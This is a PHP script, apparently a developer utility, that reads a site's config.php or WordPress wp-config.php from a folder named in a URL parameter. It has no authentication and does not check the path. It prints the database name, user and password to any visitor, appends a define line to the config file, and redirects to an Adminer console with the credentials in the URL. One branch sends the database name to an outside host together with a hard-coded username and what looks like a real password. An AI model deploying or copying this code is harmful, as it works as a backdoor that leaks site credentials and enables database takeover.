<?php

 $folderpath=$_GET['fname'];
 $panelORsite=$_GET['pors'];
 $dbshoworopen=$_GET['db'];
 $xpanel=$_GET['do'];
  $username=$_GET['username'];
  $server= $_SERVER['SERVER_NAME'];
 
 
 define('__ROOT__', dirname(dirname(__FILE__)));
 if($panelORsite=='p')
 {
  $file=__ROOT__.'/'.$folderpath.'/config.php';
  
 
    if(file_exists($file))
      {
          require_once($file); 
        if($xpanel=='xpanel'){

         
          if(defined('DEV_UPDATE'))
          {
            echo "DEV update already there";
          }
          else
          {
            $strin="\n define('DEV_UPDATE','xpanel');";
             file_put_contents($file, $strin, FILE_APPEND | LOCK_EX);
             echo "Dev update added successfully";
          }
        }
        if($dbshoworopen==open){
           
         
           if(empty($username))

          {

              $url='http://'.$server.'/db/adminer.php?username='.$config['SQL_USERNAME'].'&db='.$config['SQL_DATABASE'].'&pass='.$config['SQL_PASSWORD'] ;

                header("Location: ".$url);

          }

           else

           {

              $url='http://'.$server.'/db/adminer.php?username='.$username.'&db='.$config['SQL_DATABASE'].'&pass='.$config['SQL_PASSWORD'] ;

                header("Location: ".$url);

           }
         }
         else if($dbshoworopen==show) {

    echo '<br> dbname ='.$config['SQL_DATABASE'].'<br>username ='.$config['SQL_USERNAME'].'<br> password ='.$config['SQL_PASSWORD'].'<br> prefix ='.$config['SQL_TABLE_NAME_PREFIX'];

         }
         
      }
      else
      {
           echo "<br> Config File not available";
        }
 }
    else if($panelORsite=='s')
    {
      $file=__ROOT__.'/'.$folderpath.'/wp-config.php';
          if(file_exists($file))
      {
        require_once($file);  

       $DB_NAME=DB_NAME;
         $DB_USERNAME=DB_USER;
         $DB_PASS=DB_PASSWORD;
         $DB_PREFIX=$table_prefix;
      if( $dbshoworopen =='show')
          {
        
         echo '<br> dbname ='.$DB_NAME.'<br> username ='.$DB_USERNAME.'<br> pass ='.$DB_PASS.'<br> prefix ='.$DB_PREFIX;
            }
          else if($dbshoworopen=='open')
          {
             $url='http://mba.rxforge.in/adminer.php?username=mdrxforge&db='.$DB_NAME.'&pass=X4&5Q6,)p2i&';
          header("Location: ".$url);
          }       
           
      }
      else
      {
        echo '<br> Config File not found';
      }

    }



?>

